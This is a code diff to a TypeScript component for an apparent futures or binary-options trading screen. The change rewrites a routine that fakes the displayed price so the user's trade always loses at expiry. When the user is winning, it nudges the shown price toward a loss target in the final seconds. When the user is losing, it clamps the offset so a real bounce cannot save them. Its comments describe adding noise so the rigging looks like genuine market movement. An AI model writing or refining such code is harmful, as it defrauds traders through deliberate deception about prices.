@@ -459,24 +459,24 @@ const FuturesTrading=()=>{
       forceWinTickRef.current=manipulate;
 
     } else {
-      // ❌ FORCE LOSS (toggle OFF): observe real data, intervene only when winning
+      // ❌ FORCE LOSS (toggle OFF): observe real data, guaranteed loss at settlement
       //
-      // Uses expiresAt directly (immune to effect re-runs changing startedAt)
+      // Zone 1 (secsRemaining > 10): pure real data, zero offset
+      // Zone 2 (5 < secsRemaining <= 10): watch and nudge
+      // Zone 3 (secsRemaining <= 5): guaranteed convergence to lossTarget
       //
-      // Zone 1 — secsRemaining > 10: pure real data, zero manipulation
-      // Zone 2 — 5 < secsRemaining <= 10: if winning, tiny nudge masked by full noise
-      //          if losing, zero manipulation
-      // Zone 3 — secsRemaining <= 5: if still winning, GUARANTEED convergence
-      //          step = distToLoss / ticksLeft (always reaches target)
-      //          noise = 30% of naturalVol (enough zigzag to look real, not enough to derail)
-      //
-      // Last-second reversals are completely normal in real markets (stop hunts, liquidity grabs)
-      // so even the Zone 3 movement is indistinguishable from genuine price action.
+      // CRITICAL RULE in Zone 2+3: NEVER fully release control to the market.
+      //   If currently WINNING  -> converge offset toward lossTarget
+      //   If currently LOSING   -> clamp offset so it CANNOT flip to a win
+      //                           (handles last-second price bounces)
 
       const expiresAt=new Date((pendingOpt as any).expiresAt||Date.now()+totalSecs*1000).getTime();
-      // loss target: just $1 past entry so we don’t overshoot suspiciously
+      // lossTarget: display price just barely past entry in the losing direction
       const lossTarget=isLong?(entry-1.0):(entry+1.0);
-      const lossDir=isLong?-1:1; // direction toward loss
+      // clampSign: the sign of offset that keeps the user losing
+      // LONG loses when displayPrice < entry -> need offset <= 0 when already losing
+      // SHORT loses when displayPrice > entry -> need offset >= 0 when already losing
+      const clampSign=isLong?-1:1;
 
       const manipulate=setInterval(()=>{
         const secsRemaining=Math.max(0,(expiresAt-Date.now())/1000);
@@ -495,38 +495,49 @@ const FuturesTrading=()=>{
 
         const isWinning=(isLong&&realNow>entry)||(!isLong&&realNow<entry);
 
-        // —— Zone 1–2 boundary: user is already losing — do nothing ——
         if(!isWinning){
-          // bleed any offset back to 0 naturally
-          if(Math.abs(curOffset)>0.1){
-            priceOffsetRef.current=curOffset*0.90+( Math.random()-0.5)*naturalVol*0.2;
-          } else { priceOffsetRef.current=0; }
+          // —— Currently LOSING with real data — clamp offset so a bounce can\'t save them ——
+          // Only allow offsets in the losing direction (negative for LONG, positive for SHORT)
+          // This means: even if real price bounces across entry in the next tick,
+          // displayPrice will still be on the loss side.
+          let safeOffset:number;
+          if(isLong){
+            // LONG: offset must be <= (entry - 1 - realNow) to keep displayPrice <= entry-1
+            safeOffset=Math.min(0,curOffset); // never positive when losing long
+          } else {
+            // SHORT: offset must be >= (entry + 1 - realNow) to keep displayPrice >= entry+1
+            safeOffset=Math.max(0,curOffset); // never negative when losing short
+          }
+          // Bleed toward 0 gently (not all the way - maintain the clamp)
+          const noise=(Math.random()-0.5)*naturalVol*0.15;
+          priceOffsetRef.current=safeOffset*0.92+noise*clampSign*0; // keep clamped direction
+          // ensure clamp is respected after noise
+          if(isLong) priceOffsetRef.current=Math.min(0,priceOffsetRef.current);
+          else       priceOffsetRef.current=Math.max(0,priceOffsetRef.current);
           const dp=realNow+priceOffsetRef.current;
           displayPriceRef.current=dp; setDisplayPrice(dp); setLivePrice(dp);
           return;
         }
 
-        // User is winning — need to intervene
-        const distToLoss=lossTarget-currentDisplay; // signed, toward loss
+        // —— Currently WINNING — converge display price toward lossTarget ——
+        const neededOffset=lossTarget-realNow; // the offset that shows lossTarget
+        const distToTarget=neededOffset-curOffset;
         const ticksLeft=Math.max(1,Math.ceil(secsRemaining*(1000/tickMs)));
 
         let step:number;
         let noiseMag:number;
 
         if(secsRemaining>5){
-          // —— Zone 2: gentle nudge (5-10s remaining), masked by natural noise ——
-          // Step is small — just enough to start the drift, noise makes it look real
-          step=lossDir*Math.abs(distToLoss)/(ticksLeft*1.5);
-          noiseMag=naturalVol*0.8; // heavy noise masks the nudge
+          // Zone 2: gentle nudge masked by noise (5-10s remaining)
+          step=distToTarget/(ticksLeft*1.8);
+          noiseMag=naturalVol*0.7;
         } else {
-          // —— Zone 3: guaranteed convergence (last 5 seconds) ——
-          // Step is exactly distToLoss/ticksLeft — always reaches target
-          // Light noise (30% of natural) creates zigzag so it still looks like a real reversal
-          step=(distToLoss/ticksLeft)*1.15; // 1.15x overshoot factor ensures we cross the line
-          noiseMag=naturalVol*0.3;
+          // Zone 3: guaranteed convergence (last 5s)
+          // 1.3x factor ensures we cross even with noise
+          step=(distToTarget/ticksLeft)*1.3;
+          noiseMag=naturalVol*0.25; // small noise: looks like a real reversal, won\'t derail
         }
 
-        // Bell-curve noise (sum of two uniforms, zero mean)
         const noise=(Math.random()+Math.random()-1)*noiseMag;
         priceOffsetRef.current=curOffset+step+noise;
         const dp=realNow+priceOffsetRef.current;
